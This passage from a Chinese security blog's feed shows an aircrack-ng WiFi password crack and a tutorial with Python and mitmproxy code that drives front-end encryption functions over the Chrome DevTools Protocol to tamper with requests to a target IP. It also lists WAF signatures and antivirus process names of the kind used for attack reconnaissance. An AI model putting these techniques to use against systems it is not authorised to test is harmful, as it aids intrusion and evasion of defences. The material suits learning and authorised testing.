<p>aircrack-ng -w /root/john-1.8.0/run/password.lst 1.cap</p>
<p>因为是测试，就随便在john里面找了一个密码文件，然后在最后加上自己的wifi密码。</p>
<p>3500跳数据，1秒都没有就出来了。。。。。</p>
<p><img src="1503868-20200406141453544-163191272.png" alt>（最后打码的是密码）</p>
<p> </p>
<img src="1503868-20200406141641367-1221628472.png" alt>

<p> </p>
<p>这速度真心可以啊</p>
<p> </p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>前端解密-CDP调用-笔记</title>
    <url>/2023/04/25/%E5%89%8D%E7%AB%AF%E8%A7%A3%E5%AF%86-CDP%E8%B0%83%E7%94%A8-%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="屁话"><a href="#屁话" class="headerlink" title="屁话"></a>屁话</h1><p>​    在面对前端加密http参数的时候，如果需要解密，以前我一直是两步：</p>
<ol>
<li>首先在js代码中找到加密逻辑，这一步一般比较快，通过搜索加密关键字比如text，data，或者encode，encrypt等，然后全部打上断点，一步一步分析。如果没找到关键字就麻烦一点，只能硬着头皮看。</li>
<li>第二步一般是比较蛋疼的，在找到加密逻辑后，就需要在本地还原js代码以实现在bp或者python中调用，碍于js代码的层层嵌套结构，这一步往往花费了最多的时间和精力</li>
</ol>
<p>但是如果把断点停在调用加密函数前，在浏览器的console中就可以运行加密代码。如下</p>
<p><img src="image-20230425222922840.png" alt="image-20230425222922840"></p>
<p>1处是加密参数的代码。2处是我在console中进行调用，可以看到完成了加密，但是加密代码 <strong>m.encode((0,o.default)(s))</strong> 只能在断点停在这一步时才能运行。所以现在需要做的就是把浏览器停在这里，然后借助cdp远程运行代码。</p>
<h1 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h1><p>（前提：需要先手动找到加解密代码并且在浏览器中测试成功）</p>
<h2 id="1-启动浏览器，配置断点"><a href="#1-启动浏览器，配置断点" class="headerlink" title="1.启动浏览器，配置断点"></a>1.启动浏览器，配置断点</h2><p>需要一个chrome浏览器，找到文件位置，使用以下命令启动</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">\chrome.exe --remote-debugging-port=9222 --user-data-dir=&quot;C:\Users\This_is_Y\Desktop\test&quot;  --remote-allow-origins=http://127.0.0.1:9222 --ignore-certificate-errors</span><br></pre></td></tr></table></figure>

<p>–remote-debugging-port  ： 启远程调试，端口9222和我们之前转发出来的端口一致</p>
<p>–user-data-dir  ：设置独立的文件保存目录，建议一个网站一个目录</p>
<p>–remote-allow-origins ：允许远程调试</p>
<p>–ignore-certificate-errors   ：强制忽略掉证书错误</p>
<p>启动浏览器后，在设置中开启并打开protocol monitor，</p>
<p><img src="image-20230425224624917.png" alt="image-20230425224624917"></p>
<p><img src="image-20230425224652960.png" alt="image-20230425224652960"></p>
<h2 id="2-拿到webSocketDebuggerUrl和callFrameId"><a href="#2-拿到webSocketDebuggerUrl和callFrameId" class="headerlink" title="2.拿到webSocketDebuggerUrl和callFrameId"></a>2.拿到webSocketDebuggerUrl和callFrameId</h2><p>在确认protocol monitor启动后，访问网站，下好断点，然后让流程停在断点前。可以先在浏览器中测试，看看加解密代码能不能正常运行，如图，</p>
<p><img src="image-20230425224455605.png" alt="image-20230425224455605"></p>
<p>随后跳到协议监视器来，过滤Debugger.evaluateOnCallFrame，拿到参数<strong>callFrameId</strong></p>
<p><img src="image-20230425224747849.png" alt="image-20230425224747849"></p>
<p>然后打开<a class="link" href="http://127.0.0.1:9222/json%EF%BC%8C%E6%89%BE%E5%88%B0%E7%9B%AE%E6%A0%87%E7%BD%91%E7%AB%99%E7%9A%84webSocketDebuggerUrl">http://127.0.0.1:9222/json，找到目标网站的webSocketDebuggerUrl<i class="fas fa-external-link-alt"></i></a></p>
<p><img src="image-20230425225607568.png" alt="image-20230425225607568"></p>
<h2 id="3-测试代码"><a href="#3-测试代码" class="headerlink" title="3.测试代码"></a>3.测试代码</h2><p>python代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> websocket</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">callFrameId,js_code</span>):</span></span><br><span class="line">    <span class="comment"># 目标网站的webSocketDebuggerUrl</span></span><br><span class="line">    ws_url = <span class="string">&quot;ws://127.0.0.1:9222/devtools/page/916C5F171E538078844D5D10770465BB&quot;</span></span><br><span class="line">    conn = websocket.create_connection(ws_url,header=&#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;this_is_y&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 配置cdp命令</span></span><br><span class="line">    <span class="comment"># 解决一些小bug</span></span><br><span class="line">    false = <span class="literal">False</span></span><br><span class="line">    true = <span class="literal">True</span></span><br><span class="line">    <span class="comment"># 随意</span></span><br><span class="line">    request_id = <span class="number">1</span></span><br><span class="line">    method = <span class="string">&quot;Debugger.evaluateOnCallFrame&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># js_code = &quot;m.decode(&#x27;eyJVc2VyTmFtZSI6ImFkbWluIiwiUGFzc1dvcmQiOiIxMjM0IiwiTG9naW5UeXBlIjowLCJUb2tlbiI6IiIsInRpbWVzdGFtcCI6MTY4MjM0OTk5MTcxOX0=&#x27;)&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 注意换上callFrameId</span></span><br><span class="line">    param = &#123;<span class="string">&quot;callFrameId&quot;</span>:callFrameId,<span class="string">&quot;expression&quot;</span>:js_code,<span class="string">&quot;objectGroup&quot;</span>:<span class="string">&quot;console&quot;</span>,<span class="string">&quot;includeCommandLineAPI&quot;</span>:true,<span class="string">&quot;silent&quot;</span>:false,<span class="string">&quot;returnByValue&quot;</span>:false,<span class="string">&quot;generatePreview&quot;</span>:true&#125;</span><br><span class="line"></span><br><span class="line">    command  = &#123;<span class="string">&#x27;method&#x27;</span>: method,</span><br><span class="line">               <span class="string">&#x27;id&#x27;</span>: request_id,</span><br><span class="line">               <span class="string">&#x27;params&#x27;</span>: param&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发送命令</span></span><br><span class="line">    conn.send(json.dumps(command))</span><br><span class="line">    <span class="comment"># 接受websocket的响应，并将字符串转换为 dict()</span></span><br><span class="line">    result = json.loads(conn.recv())</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    js_code = <span class="string">&quot;m.decode(&#x27;eyJVc2VyTmFtZSI6ImFkbWluIiwiUGFzc1dvcmQiOiIxMjM0IiwiTG9naW5UeXBlIjowLCJUb2tlbiI6IiIsInRpbWVzdGFtcCI6MTY4MjM0OTk5MTcxOX0=&#x27;)&quot;</span></span><br><span class="line">    callFrameId = <span class="string">&quot;5749928402698829430.1.0&quot;</span></span><br><span class="line">    main(callFrameId,js_code)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="image-20230425230523470.png" alt="image-20230425230523470"></p>
<p>这里有一些错误消息：可供参考</p>
<h2 id="4-mitmproxy代码"><a href="#4-mitmproxy代码" class="headerlink" title="4.mitmproxy代码"></a>4.mitmproxy代码</h2><p>worker.py（还未完善）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import mitmproxy.http</span><br><span class="line">from mitmproxy import ctx, http</span><br><span class="line">import json</span><br><span class="line">import websocket</span><br><span class="line"></span><br><span class="line">ws_url &#x3D; &quot;ws:&#x2F;&#x2F;127.0.0.1:9222&#x2F;devtools&#x2F;page&#x2F;5CE4DFECA307706DCFFA590DCE41FA85&quot;</span><br><span class="line">callFrameId &#x3D; &quot;-338402750453211968.1.0&quot;</span><br><span class="line">count &#x3D; 0</span><br><span class="line"></span><br><span class="line"># error 消息：</span><br><span class="line"># &#123;&#39;code&#39;: -32000, &#39;message&#39;: &#39;Can only perform operation while paused.&#39;&#125;  断点没下好</span><br><span class="line"># &#123;&#39;code&#39;: -32000, &#39;message&#39;: &#39;Cannot find context with specified id&#39;&#125;    callFrameId可能有点问题</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main(ws_url,callFrameId,js_code):</span><br><span class="line">    conn &#x3D; websocket.create_connection(ws_url,header&#x3D;&#123;&quot;User-Agent&quot;: &quot;this_is_y&quot;&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    false &#x3D; False</span><br><span class="line">    true &#x3D; True</span><br><span class="line">    request_id &#x3D; 1</span><br><span class="line"></span><br><span class="line">    method &#x3D; &quot;Debugger.evaluateOnCallFrame&quot;</span><br><span class="line">    param &#x3D; &#123;&quot;callFrameId&quot;:callFrameId,&quot;expression&quot;:js_code,&quot;objectGroup&quot;:&quot;console&quot;,&quot;includeCommandLineAPI&quot;:true,&quot;silent&quot;:false,&quot;returnByValue&quot;:false,&quot;generatePreview&quot;:true&#125;</span><br><span class="line">    command &#x3D; &#123;&#39;method&#39;: method,</span><br><span class="line">    &#39;id&#39;: request_id,</span><br><span class="line">    &#39;params&#39;: param&#125;</span><br><span class="line"></span><br><span class="line">    # 发送命令</span><br><span class="line">    conn.send(json.dumps(command))</span><br><span class="line">    # 接受websocket的响应，并将字符串转换为 dict()</span><br><span class="line">    result &#x3D; json.loads(conn.recv())</span><br><span class="line">    # print(&quot;result:&quot;,result)</span><br><span class="line">    return result</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">def decrypt(ws_url,callFrameId,ctext):</span><br><span class="line">    js_code &#x3D; &quot;m.decode(&#39;&#123;&#125;&#39;)&quot;.format(ctext)</span><br><span class="line">    print(&quot;Js_Code:&quot;,js_code)</span><br><span class="line">    return main(ws_url,callFrameId,js_code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def encrypt(ws_url,callFrameId,ptext):</span><br><span class="line">    js_code &#x3D; &quot;m.encode(&#39;&#123;&#125;&#39;)&quot;.format(ptext)</span><br><span class="line">    print(&quot;Js_Code:&quot;,js_code)</span><br><span class="line">    return main(ws_url,callFrameId,js_code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Worker:</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.num &#x3D; 0</span><br><span class="line"></span><br><span class="line">    def request(self, flow: mitmproxy.http.HTTPFlow):</span><br><span class="line"></span><br><span class="line">        if flow.request.host !&#x3D; &quot;211.83.160.61&quot;:</span><br><span class="line">            return</span><br><span class="line"></span><br><span class="line">        print(&quot;Request &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&quot;)</span><br><span class="line">        print(&quot;body:&quot;,flow.request.method)</span><br><span class="line">        print(&quot;body:&quot;,flow.request.path)</span><br><span class="line">        print(&quot;body:&quot;,flow.request.get_text())</span><br><span class="line">        body &#x3D; flow.request.get_text()</span><br><span class="line">        if &quot;&#123;&quot; in body and &quot;&#125;&quot; in body:</span><br><span class="line">            # 未加密的明文，需要对其加密</span><br><span class="line">            result &#x3D; encrypt(ws_url,callFrameId,body)</span><br><span class="line">        else:</span><br><span class="line">            result &#x3D; decrypt(ws_url,callFrameId,body)</span><br><span class="line">        try:</span><br><span class="line">            error &#x3D; result[&#39;error&#39;]</span><br><span class="line">            print(&quot;error:&quot;,error)</span><br><span class="line">            return</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line">        v &#x3D; result[&#39;result&#39;][&#39;result&#39;][&#39;value&#39;]</span><br><span class="line">        print(&quot;V:&quot;,self.num,v,type(v))</span><br><span class="line">        self.num +&#x3D; 1</span><br><span class="line">        flow.request.content &#x3D; v.encode(&#39;utf-8&#39;)</span><br><span class="line"></span><br><span class="line">    def response(self, flow: mitmproxy.http.HTTPFlow):</span><br><span class="line">        if flow.request.host !&#x3D; &quot;211.83.160.61&quot;:</span><br><span class="line">            return</span><br><span class="line"></span><br><span class="line">        print(&quot;Response &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&quot;)</span><br><span class="line">        print(&quot;body:&quot;,flow.response.get_text())</span><br><span class="line">        body &#x3D; flow.response.get_text()</span><br><span class="line">        result &#x3D; decrypt(ws_url,callFrameId,body)</span><br><span class="line">        try:</span><br><span class="line">            error &#x3D; result[&#39;error&#39;]</span><br><span class="line">            print(&quot;error:&quot;,error)</span><br><span class="line">            return</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line">        v &#x3D; result[&#39;result&#39;][&#39;result&#39;][&#39;value&#39;]</span><br><span class="line">        print(&quot;V:&quot;,self.num,v,type(v))</span><br><span class="line">        self.num +&#x3D; 1</span><br><span class="line">        flow.response.content &#x3D; v.encode(&#39;utf-8&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">addons &#x3D; [</span><br><span class="line">    Worker()</span><br><span class="line">]</span><br></pre></td></tr></table></figure>



<p>使用该代码，配合mitmproxy的正向代理模式，</p>
<ul>
<li>mitmweb -s .\3.py -p 8082 –mode regular</li>
</ul>
<p>同时在User options  -&gt; UpStream Proxy Servers 中添加mitmproxy监听的8082端口</p>
<p><img src="image-20230427010258503.png" alt="image-20230427010258503"></p>
<p>已经可以做到在burp-repeater中发送明文请求，自动解密返回</p>
<p><img src="image-20230427010102577.png" alt="image-20230427010102577"></p>
<p>但是没法做到burp抓包自动解密，可以用mitm上游代理的方式转发数据包到burp，但是那样子burp不能发出包</p>
<p>最后还是放弃了用python结合 mitmproxy的方法，</p>
<h1 id="理想状态"><a href="#理想状态" class="headerlink" title="理想状态"></a>理想状态</h1><p><img src="image-20230427011105760.png" alt="image-20230427011105760"></p>
<h1 id="BURP开发"><a href="#BURP开发" class="headerlink" title="BURP开发"></a>BURP开发</h1><p>最好的还是写一个burp插件来完成这件事，所以我花了一个月的时间来写这个插件<del>虽然每天就写半小时</del>。最后简单完成了一个丑陋的的插件</p>
<ul>
<li><input checked disabled type="checkbox"> 加密参数选择</li>
<li><input checked disabled type="checkbox"> 动态添加参数</li>
<li><input checked disabled type="checkbox"> 工具目标地址自动获取wsurl并可以发送cdp命令到服务器</li>
<li><input checked disabled type="checkbox"> 可以发送http请求并回显</li>
<li><input disabled type="checkbox"> 可以修改请求并解密回显</li>
<li><input disabled type="checkbox"> 自动获取callFrameId</li>
<li><input disabled type="checkbox"> 优化ui页面</li>
</ul>
<p><img src="image-20230531224445531.png" alt="image-20230531224445531"></p>
<p>还顺便写了一个测试CDP的小工具</p>
<p><img src="image-20230531220339150.png" alt="image-20230531220339150"></p>
<h1 id="autoDecoder"><a href="#autoDecoder" class="headerlink" title="autoDecoder"></a>autoDecoder</h1><p><a class="link" href="https://github.com/f0ng/autoDecoder">https://github.com/f0ng/autoDecoder<i class="fas fa-external-link-alt"></i></a></p>
<p>在朋友帮助下知道了这个插件，发现可以将cdp调用的过程打包为python的web接口，然后通过这个工具完成解密。</p>
<h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><h2 id="1-Handshake-status-403-Forbidden"><a href="#1-Handshake-status-403-Forbidden" class="headerlink" title="1.Handshake status 403 Forbidden"></a>1.Handshake status 403 Forbidden</h2><p>这一步卡了我非常久，打算写细致一点。在运行别人的代码的时候，发现一直报错</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">websocket._exceptions.WebSocketBadStatusException: Handshake status 403 Forbidden</span><br></pre></td></tr></table></figure>

<p>唯一一个有帮助的就是在**websocket.create_connection()<strong>前加上</strong>websocket.enableTrace(True)**查看数据包细节。这引导我使用wireshark去抓包查看原始数据包是什么样子</p>
<p><img src="image-20230425223833826.png" alt="image-20230425223833826"></p>
<p>然后在wireshark中发现了这个。可以看到右边的提示信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Rejected an incoming WebSocket connection from the http:&#x2F;&#x2F;127.0.0.1:9222 origin.  Use the command line flag --remote-allow-origins&#x3D;http:&#x2F;&#x2F;127.0.0.1:9222 to allow connections from this origin or --remote-allow-origins&#x3D;* to allow all origins.</span><br></pre></td></tr></table></figure>

<p>在简单查了点资料和测试下，我在浏览器启动的时候加上了**–remote-allow-origins=<a class="link" href="http://127.0.0.1:9222/">http://127.0.0.1:9222<i class="fas fa-external-link-alt"></i></a>** 参数，才解决问题</p>
<h2 id="2-callFrameId"><a href="#2-callFrameId" class="headerlink" title="2.callFrameId"></a>2.callFrameId</h2><p>在发送cdp命令的时候，需要用到<strong>callFrameId</strong>参数，这个参数我还没找到怎么使用代码自动获取，先留个坑</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a class="link" href="https://1oid.github.io/2023/02/15/frontend-encrypt-crack-cdp-debug-function-eval/">https://1oid.github.io/2023/02/15/frontend-encrypt-crack-cdp-debug-function-eval/<i class="fas fa-external-link-alt"></i></a><br><a class="link" href="https://chromedevtools.github.io/devtools-protocol/tot/Debugger/">https://chromedevtools.github.io/devtools-protocol/tot/Debugger/<i class="fas fa-external-link-alt"></i></a><br><a class="link" href="https://blog.csdn.net/freeking101/article/details/110213782">https://blog.csdn.net/freeking101/article/details/110213782<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
  </entry>
  <entry>
    <title>博客园装饰</title>
    <url>/2020/01/18/%E5%8D%9A%E5%AE%A2%E5%9B%AD%E8%A3%85%E9%A5%B0-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12210655.html">源地址：https://www.cnblogs.com/This-is-Y/p/12210655.html<i class="fas fa-external-link-alt"></i></a></p>
<p>装饰一下博客</p>
<p>开通js什么的这些功能网上都很多很全了，这里记录找到的几个写得比较好的博客</p>
<p>较为全面的两个：<a class="link" href="https://www.cnblogs.com/zhaopei/p/4174811.html">https://www.cnblogs.com/zhaopei/p/4174811.html<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link" href="https://www.cnblogs.com/guokaifeng/p/11121939.html">https://www.cnblogs.com/guokaifeng/p/11121939.html<i class="fas fa-external-link-alt"></i></a> </p>
<p>（现在生成外链链接可能会没用，歌单上面的id其实就是外链id</p>
<img src="1503868-20200118230136057-1795119443.png" alt>

<p> </p>
<p>可以看到这里的id和上面一样，至于其他的参数，前面两个教程都有解释</p>
<img src="1503868-20200118230447941-838547165.png" alt>

<p> </p>
<p>有些时候发现博客园装饰出了点问题，不妨把这个禁用了 ↓↓</p>
<img src="1503868-20200312211648481-430248655.png" alt>

<p> </p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>各种WAF识别以及杀毒软件进程</title>
    <url>/2020/10/25/%E5%90%84%E7%A7%8DWAF%E8%AF%86%E5%88%AB%E4%BB%A5%E5%8F%8A%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6%E8%BF%9B%E7%A8%8B-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13873799.html">源地址：https://www.cnblogs.com/This-is-Y/p/13873799.html<i class="fas fa-external-link-alt"></i></a></p>
<p>转自潇湘信安</p>
<h3 id="WAF识别"><a href="#WAF识别" class="headerlink" title="WAF识别"></a>WAF识别</h3><p>1、D盾<br>  <img src="1503868-20201025161151977-657844461.png" alt loading="lazy"></p>
<p> </p>
<p> </p>
<p><br>云锁<br>  <img src="1503868-20201025160651639-1779137502.png" alt loading="lazy"></p>
<p> </p>
<p> </p>
<p> </p>
<p><br>UPUPW安全防护<br>  <img src="1503868-20201025160701301-910893185.png" alt loading="lazy"></p>
<p> </p>
<p> </p>
<p> </p>
<p><br>宝塔网站防火墙<br>  <img src="1503868-20201025160713913-499430966.png" alt loading="lazy"></p>
<p> </p>
<p> </p>
<p> </p>
<p><br>网防G01<br>  <img src="1503868-20201025160720340-557521161.png" alt loading="lazy"></p>
<p> </p>
<p> </p>
<p> </p>
<p><br>护卫神<br>  <img src="1503868-20201025160725998-749560362.png" alt loading="lazy"></p>
<p> </p>
<p> </p>
<p> </p>
<p><br>网站安全狗<br>  <img src="1503868-20201025160736058-1885330168.png" alt loading="lazy"></p>
<p> </p>
<p> </p>
<p> </p>
<p><br>智创防火墙<br>  <img src="1503868-20201025160741463-1907393008.png" alt loading="lazy"></p>
<p> </p>
<p> </p>
<p> </p>
<p><br>360主机卫士或360webscan<br>  <img src="1503868-20201025160750779-1075183302.png" alt loading="lazy"></p>
<p> </p>
<p> </p>
<p> </p>
<p><br>西数WTS-WAF<br>  <img src="1503868-20201025160756458-323909198.png" alt loading="lazy"></p>
<p> </p>
<p> </p>
<p> </p>
<p><br>Naxsi WAF<br>  <img src="1503868-20201025160801653-1150279032.png" alt loading="lazy"></p>
<p> </p>
<p> </p>
<p> </p>
<p><br>腾讯云<br>  <img src="1503868-20201025160807330-1846906250.png" alt loading="lazy"></p>
<p> </p>
<p> </p>
<p> </p>
<p><br>腾讯宙斯盾<br>  <img src="1503868-20201025160814583-1844972539.png" alt loading="lazy"></p>
<p> </p>
<p> </p>
<p> </p>
<p><br>百度云<br>  <img src="1503868-20201025160852998-1187155878.png" alt loading="lazy"></p>
<p> </p>
<p> </p>
<p> </p>
<p><br>华为云<br>  <img src="1503868-20201025160900728-1621660561.png" alt loading="lazy"></p>
<p> </p>
<p> </p>
<p> </p>
<p><br>网宿云<br>  <img src="1503868-20201025160908582-1860579097.png" alt loading="lazy"></p>
<p> </p>
<p> </p>
<p> </p>
<p><br>创宇盾<br>  <img src="1503868-20201025160915594-1293067482.png" alt loading="lazy"></p>
<p> </p>
<p> </p>
<p> </p>
<p><br>玄武盾<br>  <img src="1503868-20201025160920942-250955131.png" alt loading="lazy"></p>
<p> </p>
<p> </p>
<p> </p>
<p><br>阿里云盾<br>  <img src="1503868-20201025160928040-616360980.png" alt loading="lazy"></p>
<p> </p>
<p> </p>
<p> </p>
<p><br>360网站卫士<br>  <img src="1503868-20201025160935696-1672126245.png" alt loading="lazy"></p>
<p> </p>
<p> </p>
<p> </p>
<p><br>奇安信网站卫士<br>  <img src="1503868-20201025160943321-1577850795.png" alt loading="lazy"></p>
<p> </p>
<p> </p>
<p> </p>
<p><br>安域云WAF<br>  <img src="1503868-20201025160948569-1155427446.png" alt loading="lazy"></p>
<p> </p>
<p> </p>
<p> </p>
<p><br>铱讯WAF<br>  <img src="1503868-20201025160953735-973628966.png" alt loading="lazy"></p>
<p> </p>
<p> </p>
<p> </p>
<p><br>长亭SafeLine<br>  <img src="1503868-20201025160957999-436648562.png" alt loading="lazy"></p>
<p> </p>
<p> </p>
<p> </p>
<p><br>安恒明御WAF<br>  <img src="1503868-20201025161006662-1765957406.png" alt loading="lazy"></p>
<p> </p>
<p> </p>
<p> </p>
<p><br>F5 BIG-IP<br>  <img src="1503868-20201025161022130-389736322.png" alt loading="lazy"></p>
<p> </p>
<p> </p>
<p> </p>
<p><br>Mod_Security<br>  <img src="1503868-20201025161031090-1321942219.png" alt loading="lazy"></p>
<p> </p>
<p> </p>
<p> </p>
<p><br>OpenRASP<br>  <img src="1503868-20201025161101062-850543996.png" alt loading="lazy"></p>
<p> </p>
<p> </p>
<p> </p>
<p><br>dotDefender<br>  <img src="1503868-20201025161037217-1062888603.png" alt><br>未知云WAF<br>  <img src="1503868-20201025161048659-1624763334.png" alt loading="lazy"></p>
<p> </p>
<p> </p>
<h3 id="杀软进程名"><a href="#杀软进程名" class="headerlink" title="杀软进程名"></a>杀软进程名</h3><p>网页用ctrl+f快速查找</p>
<p>{对应的进程名称 杀毒软件}<br> {“360tray.exe”, “360安全卫士”},<br> {“360sd.exe”, “360杀毒”},<br> {“a2guard.exe”, “a-squared杀毒”},<br> {“ad-watch.exe”, “Lavasoft杀毒”},<br> {“cleaner8.exe”, “The Cleaner杀毒”},<br> {“vba32lder.exe”, “vb32杀毒”},<br> {“MongoosaGUI.exe”, “Mongoosa杀毒”},<br> {“CorantiControlCenter32.exe”, “Coranti2012杀毒”},<br> {“F-PROT.EXE”, “F-PROT杀毒”},<br> {“CMCTrayIcon.exe”, “CMC杀毒”},<br> {“K7TSecurity.exe”, “K7杀毒”},<br> {“UnThreat.exe”, “UnThreat杀毒”},<br> {“CKSoftShiedAntivirus4.exe”, “Shield Antivirus杀毒”},<br> {“AVWatchService.exe”, “VIRUSfighter杀毒”},<br> {“ArcaTasksService.exe”, “ArcaVir杀毒”},<br> {“iptray.exe”, “Immunet杀毒”},<br> {“PSafeSysTray.exe”, “PSafe杀毒”},<br> {“nspupsvc.exe”, “nProtect杀毒”},<br> {“SpywareTerminatorShield.exe”, “SpywareTerminator杀毒”},<br> {“BKavService.exe”, “Bkav杀毒”},<br> {“MsMpEng.exe”, “Microsoft Security Essentials”},<br> {“SBAMSvc.exe”, “VIPRE”},<br> {“ccSvcHst.exe”, “Norton杀毒”},<br> {“QQ.exe”, “QQ”},<br> {“f-secure.exe”, “冰岛”},<br> {“avp.exe”, “卡巴斯基”},<br> {“KvMonXP.exe”, “江民杀毒”},<br> {“RavMonD.exe”, “瑞星杀毒”},<br> {“Mcshield.exe”, “麦咖啡”},<br> {“egui.exe”, “NOD32”},<br> {“kxetray.exe”, “金山毒霸”},<br> {“knsdtray.exe”, “可牛杀毒”},<br> {“TMBMSRV.exe”, “趋势杀毒”},<br> {“avcenter.exe”, “Avira(小红伞)”},<br> {“ashDisp.exe”, “Avast网络安全”},<br> {“rtvscan.exe”, “诺顿杀毒”},<br> {“ksafe.exe”, “金山卫士”},<br> {“QQPCRTP.exe”, “QQ电脑管家”},<br> {“Miner.exe”, “流量矿石”},<br> {“AYAgent.aye”, “韩国胶囊”},<br> {“patray.exe”, “安博士”},<br> {“V3Svc.exe”, “安博士V3”},<br> {“avgwdsvc.exe”, “AVG杀毒”},<br> {“ccSetMgr.exe”, “赛门铁克”},<br> {“QUHLPSVC.EXE”, “QUICK HEAL杀毒”},<br> {“mssecess.exe”, “微软杀毒”},<br> {“SavProgress.exe”, “Sophos杀毒”},<br> {“fsavgui.exe”, “F-Secure杀毒”},<br> {“vsserv.exe”, “比特梵德”},<br> {“remupd.exe”, “熊猫卫士”},<br> {“FortiTray.exe”, “飞塔”},<br> {“safedog.exe”, “安全狗”},<br> {“parmor.exe”, “木马克星”},<br> {“beikesan.exe”, “贝壳云安全”},<br> {“KSWebShield.exe”, “金山网盾”},<br> {“TrojanHunter.exe”, “木马猎手”},<br> {“GG.exe”, “巨盾网游安全盾”},<br> {“adam.exe”, “绿鹰安全精灵”},<br> {“AST.exe”, “超级巡警”},<br> {“ananwidget.exe”, “墨者安全专家”},<br> {“AVK.exe”, “GData”},<br> {“ccapp.exe”, “Symantec Norton”},<br> {“avg.exe”, “AVG Anti-Virus”},<br> {“spidernt.exe”, “Dr.web”},<br> {“Mcshield.exe”, “Mcafee”},<br> {“avgaurd.exe”, “Avira Antivir”},<br> {“F-PROT.exe”, “F-Prot AntiVirus”},<br> {“vsmon.exe”, “ZoneAlarm”},<br> {“avp.exee”, “Kaspersky”},<br> {“cpf.exe”, “Comodo”},<br> {“outpost.exe”, “Outpost Firewall”},<br> {“rfwmain.exe”, “瑞星防火墙”},<br> {“kpfwtray.exe”, “金山网镖”},<br> {“FYFireWall.exe”, “风云防火墙”},<br> {“MPMon.exe”, “微点主动防御”},<br> {“pfw.exe”, “天网防火墙”},<br> {“S.exe”, “在抓鸡”},<br> {“1433.exe”, “在扫1433”},<br> {“DUB.exe”, “在爆破”},<br> {“ServUDaemon.exe”, “发现S-U”},<br> {“BaiduSdSvc.exe”, “百度杀软”},</p>
<p>安全狗</p>
<p> SafeDogGuardCenter.exe<br> safedogupdatecenter.exe<br> safedogguardcenter.exe<br> SafeDogSiteIIS.exe<br> SafeDogTray.exe<br> SafeDogServerUI.exe</p>
<p> D盾 </p>
<p>D_Safe_Manage.exe<br> d_manage.exe</p>
<p> 云锁<br> </p>
<p>yunsuo_agent_service.exe<br> yunsuo_agent_daemon.exe</p>
<p> 护卫神 </p>
<p>HwsPanel.exe 护卫神·入侵防护系统（状态托盘）<br> hws_ui.exe 护卫神·入侵防护系统 - <a class="link" href="http://www.huweishen.com/">www.huweishen.com<i class="fas fa-external-link-alt"></i></a><br> hws.exe 护卫神·入侵防护系统 服务处理程序<br> hwsd.exe 护卫神·入侵防护系统 监控组件</p>
<p> 火绒 </p>
<p>hipstray.exe<br> wsctrl.exe<br> usysdiag.exe</p>
<p><br><br><br><br><br></p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>在博客中添加自定义页面</title>
    <url>/2021/06/19/%E5%9C%A8%E5%8D%9A%E5%AE%A2%E4%B8%AD%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89%E9%A1%B5%E9%9D%A2-This-is-Y/</url>
    <content><![CDATA[<h2 id="创建页面文件夹"><a href="#创建页面文件夹" class="headerlink" title="创建页面文件夹"></a>创建页面文件夹</h2><p>在blog/source下面，创建一个文件夹，里面就是要自定义的网页的全部文件。最好是有过index.html</p>
